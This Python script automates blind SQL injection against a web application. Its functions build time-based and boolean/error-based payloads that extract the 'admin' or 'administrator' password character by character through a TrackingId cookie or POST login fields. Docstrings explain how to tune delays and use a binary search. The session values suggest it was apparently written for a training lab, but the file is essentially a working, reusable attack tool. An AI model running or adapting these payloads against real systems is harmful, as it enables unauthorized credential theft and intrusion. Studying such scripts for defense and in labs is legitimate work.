import requests
import time



def bad_sql_query_time(indice: str=None, parameter: str=None):
    bad_sql = f"' and (select case when ((select substr(password,{indice},1) from users where username='admin'){parameter}) then 1337=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) else null end)--"
    return bad_sql

"""
    The function here is used to perform blind time based SQLi. 
    
    ### CONCERNING THE COOKIES OPTION : ####"
    
    First of all, the default function will use cookies to make SQLi. 
    You can simply delete the "cookies" dictionnary or quotes theme to make a simple commentary. If you make that, please make sure to change the
    "r" variable. It contain the "cookies" options and if you don't delete it, problem can be create.
    
    ### CONCERNING THE RESULT_BOOL VARIABLE ###
    
    This attack used widely the time to perform his technic. Make sure to have a good connection and to modify the "5" seconds remaining if
    this is not enought. I recommend to not lower the value below 5, in case, false-positiv can be detected. Understand that the waiting time 
    is not precisely 5 or 10 seconds, but a arrondissement.
    
    ### CONCERNING THE bad_sqli_query FUNCTION ###
    Make sure to change the bad_sql variable in the bad_sqli_query function. But be sure to include an SQL query that corresponds to the technique you're using !
    Make sure to use correctly the variable, in need IT'S POSSIBLE to not use the parameter (look the default parameter of the variable)
     
    ### RETURN VARIABLE ###
    The result_bool and result_control return variable are very important. The first, the result_cool variable help to know if the first query work, or not.
    The function make to query. The first with an "<" or ">" in the query. It will help to know which party we keep after the dichotomy. 
    The second query have an "=" to make sure that the parameter of the first query is good (or not). This is a security request. 

"""


def sending_payload_for_time_based_SQLi_getv(payload_parameter1 : str, payload_parameter2: str,url: str, indice: int) -> bool:
    
    #The payload is in the bad_sql_query function
    
    bad_sql1 = bad_sql_query_time(indice, payload_parameter1)
    
    #SET THE COOKIES HERE WITH NAME AND VALUE IF NOT... JUST MAKE IT EMPTY !!!
    cookies = {
        'TrackingId': f"XXX{bad_sql1}",
        'session': 'xxx'
    }
    
    """Where the magic happens, we start the clock to know how much time the server answer to us"""
    
    start_time = time.time()
    r = requests.get(url, cookies=cookies)
    end_time = time.time()
    
    """Here we will know if the SQL_query will work, with a simple boolean operation"""

    result_bool = (end_time - start_time) >= 5
    
    
    if result_bool:
        print(f"This parameter work: {payload_parameter1}")
    else:
        print("")    
    
        
    bad_sql2 = bad_sql_query_time(indice, payload_parameter2)
    cookies = {
            'TrackingId': f"xxx	{bad_sql2}",
            'session': 'XXX'
        }
    
    start_time = time.time()
    r = requests.get(url, cookies=cookies)
    end_time = time.time()
    
    
    result_control = (end_time - start_time) >= 5
    
    
    if result_control:
        print(f"Value found with this parameter: {payload_parameter2}")
    else:
        print("")  
        
          
    return result_bool, result_control


"""********************Same function here but we sending a post request and not a get requests*****************************************"""

def sending_payload_for_time_based_SQLi_postv(payload_parameter1 : str, payload_parameter2: str,url: str, indice: int) -> bool:
    
    #The payload is in the bad_sql_query function
    
    bad_sql1 = bad_sql_query_time(indice, payload_parameter1)
    
    #here put the data value, if is empty just do that : data=...
    data=f"username=admin{bad_sql1}&password=foo"
    
    """Where the magic happens, we start the clock to know how much time the server answer to us"""
    
    start_time = time.time()
    r = requests.post(url, data=data)
    end_time = time.time()
    
    """Here we will know if the SQL_query will work, with a simple boolean operation"""

    result_bool = (end_time - start_time) >= 4
    
    
    if result_bool:
        print(f"This parameter work: {payload_parameter1}")
    else:
        print("")    
    
        
    bad_sql2 = bad_sql_query_time(indice, payload_parameter2)
    data=f"username=admin{bad_sql2}&password=bar"
    
    start_time = time.time()
    r = requests.post(url, data=data)
    end_time = time.time()
    
    
    result_control = (end_time - start_time) >= 4
    
    
    if result_control:
        print(f"Value found with this parameter: {payload_parameter2}")
    else:
        print("")  
        
          
    return result_bool, result_control



"""-------------------------------------------------BOOLEAN BASED SQL INJECTION-------------------------------------------------------"""




def bad_sql_query_boolean(indice: str=None, parameter: str=None):
    bad_sql = f"'||(SELECT CASE WHEN SUBSTR(password,{indice},1){parameter} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
    return bad_sql


"""
    The function here is used to perform boolean-based SQLi. 
    
    ### CONCERNING THE COOKIES OPTION : ####"
    First of all, the default function will use cookies to make SQLi. 
    You can simply delete the "cookies" dictionnary or quotes theme to make a simple commentary. If you make that, please make sure to change the
    "r" variable. It contain the "cookies" options and if you don't delete it, problem can be create.
    
    ### CONCERNING THE bad_sqli_query FUNCTION ###
    Make sure to change the bad_sql variable in the bad_sqli_query function. But be sure to include an SQL query that corresponds to the technique you're using !
    Make sure to use correctly the variable, in need IT'S POSSIBLE to not use the parameter (look the default parameter of the variable)
    
    ### RETURN VARIABLE ###
    The status_code and status_code2 return variable are very important. The first, the status_code variable help to know if the first query work, or not.
    The function make to query. The first with an "<" or ">" in the query. It will help to know which party we keep after the dichotomy. 
    The second query have an "=" to make sure that the parameter of the first query is good (or not). This is a security request. 

"""


def sending_payload_for_boolean_based_SQLi(payload_parameter1 : str, payload_parameter2: str,url: str, indice: int) -> int:
    
    #The payload is in the bad_sql_query function
    
    bad_sql1 = bad_sql_query_boolean(indice, payload_parameter1)
    
    #SET THE COOKIES HERE WITH NAME AND VALUE IF NOT... JUST MAKE IT EMPTY !!!
    cookies = {
        'TrackingId': f"XVmK2up50yoi6anT{bad_sql1}",
        'session': 'snNXaKrRa0DHU2GhnSekRYOLJgQYWFzA'
    }
    
   
    r = requests.get(url, cookies=cookies)
    status_code = r.status_code

    
    
    if status_code != 200:
        print(f"This parameter work: {payload_parameter1}")
    else:
        print("")    
    
        
    bad_sql2 = bad_sql_query_boolean(indice, payload_parameter2)
    cookies = {
            'TrackingId': f"XVmK2up50yoi6anT{bad_sql2}",
            'session': 'snNXaKrRa0DHU2GhnSekRYOLJgQYWFzA'
        }
    
    
    r2 = requests.get(url, cookies=cookies)
    status_code2 = r2.status_code
    
    if status_code2  != 200:
        print(f"Value found with this parameter: {payload_parameter2}")
    else:
        print("")  
        
          
    return status_code, status_code2

